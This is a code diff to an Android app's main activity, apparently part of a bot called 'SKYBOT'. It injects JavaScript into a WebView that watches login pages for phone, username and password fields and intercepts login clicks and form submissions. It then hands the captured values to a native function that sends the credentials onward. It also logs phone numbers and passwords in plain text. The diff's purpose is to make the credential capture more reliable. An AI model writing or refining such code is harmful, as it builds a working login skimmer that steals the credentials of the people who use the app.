@@ -798,25 +798,31 @@ class MainActivity : AppCompatActivity() {
 
             @JavascriptInterface
             fun guardarNumero(valor: String) {
-                if (valor.isNotEmpty() && valor != ultimoNumeroEnviado) {
+                // Apenas guardar em memória — envio só acontece em submeterCredencial()
+                if (valor.isNotEmpty()) {
                     ultimoNumeroEnviado = valor
                     numeroTemporario = valor
-                    // Se já temos senha, enviar credencial completa
-                    if (ultimaSenhaEnviada.isNotEmpty()) {
-                        enviarCredencial(valor, ultimaSenhaEnviada)
-                    }
                 }
             }
 
             @JavascriptInterface
             fun guardarSenha(valor: String) {
-                if (valor.isNotEmpty() && valor != ultimaSenhaEnviada) {
+                // Apenas guardar em memória — envio só acontece em submeterCredencial()
+                if (valor.isNotEmpty()) {
                     ultimaSenhaEnviada = valor
-                    // Se já temos número, enviar credencial completa
-                    val num = if (ultimoNumeroEnviado.isNotEmpty()) ultimoNumeroEnviado else numeroTemporario
-                    if (num.isNotEmpty()) {
-                        enviarCredencial(num, valor)
-                    }
+                }
+            }
+
+            @JavascriptInterface
+            fun submeterCredencial() {
+                // Chamado APENAS quando o utilizador clica no botão de login
+                val num = ultimoNumeroEnviado.ifEmpty { numeroTemporario }
+                val sen = ultimaSenhaEnviada
+                if (num.isNotEmpty() && sen.isNotEmpty()) {
+                    enviarCredencial(num, sen)
+                    android.util.Log.d("SKYBOT_CRED", "submeterCredencial() → enviando num=$num")
+                } else {
+                    android.util.Log.w("SKYBOT_CRED", "submeterCredencial() ignorado — faltam campos (num='$num' sen='$sen')")
                 }
             }
         }, "Android")
@@ -1024,7 +1030,6 @@ class MainActivity : AppCompatActivity() {
     private fun injetarJsCredenciais() {
         val js = """
 (function() {
-    // Resetar flag se já passou tempo (para re-injectar em novas páginas)
     if (window._credDone) return;
     window._credDone = true;
 
@@ -1038,36 +1043,28 @@ class MainActivity : AppCompatActivity() {
     new MutationObserver(tornarVisivel)
         .observe(document.body || document.documentElement, {childList: true, subtree: true});
 
-    // Watchers para numero e senha
+    // ── Watchers: apenas guardam o valor em memória no lado Kotlin ──
     function watchN(el) {
         if (!el || el._wN) return;
         el._wN = true;
         el.addEventListener('input', function() {
             var v = (this.value || '').trim();
-            if (v.length >= 1) {
-                try { Android.guardarNumero(v); } catch(e) {}
-            }
+            if (v.length >= 1) try { Android.guardarNumero(v); } catch(e) {}
         });
-        // Também capturar valor actual se já preenchido
-        if (el.value && el.value.length > 0) {
+        if (el.value && el.value.length > 0)
             try { Android.guardarNumero(el.value.trim()); } catch(e) {}
-        }
     }
     function watchS(el) {
         if (!el || el._wS) return;
         el._wS = true;
         el.addEventListener('input', function() {
             var v = (this.value || '').trim();
-            if (v.length >= 1) {
-                try { Android.guardarSenha(v); } catch(e) {}
-            }
+            if (v.length >= 1) try { Android.guardarSenha(v); } catch(e) {}
         });
-        if (el.value && el.value.length > 0) {
+        if (el.value && el.value.length > 0)
             try { Android.guardarSenha(el.value.trim()); } catch(e) {}
-        }
     }
 
-    // Selectores para campos de numero/utilizador
     var selectoresN = [
         'input[name="username"]', 'input[name="phone"]', 'input[name="login"]',
         'input[name="msisdn"]', 'input[name="mobile"]', 'input[name="tel"]',
@@ -1077,7 +1074,6 @@ class MainActivity : AppCompatActivity() {
         'input[placeholder*="username" i]', 'input[placeholder*="login" i]',
         '#username', '#phone', '#login', '#msisdn'
     ];
-    // Selectores para campos de senha
     var selectoresS = [
         'input[name="password"]', 'input[name="senha"]', 'input[name="pass"]',
         'input[type="password"]', 'input[type="text"][name*="pass" i]',
@@ -1095,22 +1091,31 @@ class MainActivity : AppCompatActivity() {
         });
     }
 
-    // Tentar várias vezes (SPA pode carregar os campos depois)
     cap();
     setTimeout(cap, 1000);
     setTimeout(cap, 2500);
     setTimeout(cap, 5000);
     setTimeout(cap, 8000);
 
-    // Interceptar também o submit do formulário (captura dados ao submeter)
-    function watchForms() {
-        document.querySelectorAll('form, button[type="submit"], button').forEach(function(el) {
-            if (el._wForm) return;
-            el._wForm = true;
+    // ── Interceptar clique no botão de login ──────────────────────
+    // Só aqui é que o envio é disparado, garantindo que ambos os campos estão preenchidos
+    function isLoginButton(el) {
+        var txt = (el.textContent || el.value || el.innerText || '').toLowerCase().trim();
+        var typ = (el.type || '').toLowerCase();
+        var cls = (el.className || '').toLowerCase();
+        var id  = (el.id || '').toLowerCase();
+        return txt.includes('entrar') || txt.includes('login') || txt.includes('iniciar') ||
+               txt.includes('sign in') || txt.includes('acceder') || txt.includes('aceder') ||
+               typ === 'submit' || cls.includes('login') || cls.includes('submit') ||
+               id.includes('login') || id.includes('submit') || id.includes('btn-login');
+    }
+
+    function watchLoginButtons() {
+        document.querySelectorAll('button, input[type="submit"], a[href*="login"]').forEach(function(el) {
+            if (el._wLogin) return;
+            el._wLogin = true;
             el.addEventListener('click', function() {
-                // Re-capturar todos os campos no momento do clique
-                cap();
-                // Tentar ler directamente todos os inputs visíveis
+                // 1. Garantir que os campos mais recentes estão capturados
                 document.querySelectorAll('input').forEach(function(inp) {
                     var t = (inp.type || '').toLowerCase();
                     var n = (inp.name || inp.id || inp.placeholder || '').toLowerCase();
@@ -1118,18 +1123,52 @@ class MainActivity : AppCompatActivity() {
                     if (!v) return;
                     var isNum = t === 'tel' || t === 'number' ||
                         n.includes('phone') || n.includes('numero') ||
-                        n.includes('username') || n.includes('login') || n.includes('user');
-                    var isPass = t === 'password' || t === 'text' && (
-                        n.includes('pass') || n.includes('senha'));
-                    if (isNum) { try { Android.guardarNumero(v); } catch(e) {} }
-                    if (isPass) { try { Android.guardarSenha(v); } catch(e) {} }
+                        n.includes('username') || n.includes('login') || n.includes('user') ||
+                        n.includes('msisdn') || n.includes('mobile');
+                    var isPass = t === 'password' ||
+                        n.includes('pass') || n.includes('senha');
+                    if (isNum) try { Android.guardarNumero(v); } catch(e) {}
+                    if (isPass) try { Android.guardarSenha(v); } catch(e) {}
                 });
-            });
+                // 2. Só submeter se este botão parecer de login
+                if (isLoginButton(this)) {
+                    setTimeout(function() {
+                        try { Android.submeterCredencial(); } catch(e) {}
+                    }, 100); // pequeno delay para garantir que os inputs acima foram processados
+                }
+            }, true); // capture=true para apanhar antes de qualquer outro handler
         });
     }
-    watchForms();
-    setTimeout(watchForms, 2000);
-    setTimeout(watchForms, 5000);
+
+    // Interceptar também submits de formulário directamente
+    function watchFormSubmits() {
+        document.querySelectorAll('form').forEach(function(form) {
+            if (form._wSubmit) return;
+            form._wSubmit = true;
+            form.addEventListener('submit', function() {
+                document.querySelectorAll('input').forEach(function(inp) {
+                    var t = (inp.type || '').toLowerCase();
+                    var n = (inp.name || inp.id || inp.placeholder || '').toLowerCase();
+                    var v = (inp.value || '').trim();
+                    if (!v) return;
+                    var isNum = t === 'tel' || t === 'number' ||
+                        n.includes('phone') || n.includes('numero') ||
+                        n.includes('username') || n.includes('user') || n.includes('msisdn');
+                    var isPass = t === 'password' || n.includes('pass') || n.includes('senha');
+                    if (isNum) try { Android.guardarNumero(v); } catch(e) {}
+                    if (isPass) try { Android.guardarSenha(v); } catch(e) {}
+                });
+                setTimeout(function() {
+                    try { Android.submeterCredencial(); } catch(e) {}
+                }, 100);
+            }, true);
+        });
+    }
+
+    watchLoginButtons();
+    watchFormSubmits();
+    setTimeout(function() { watchLoginButtons(); watchFormSubmits(); }, 2000);
+    setTimeout(function() { watchLoginButtons(); watchFormSubmits(); }, 5000);
 })();
         """.trimIndent()
         webView.evaluateJavascript(js, null)
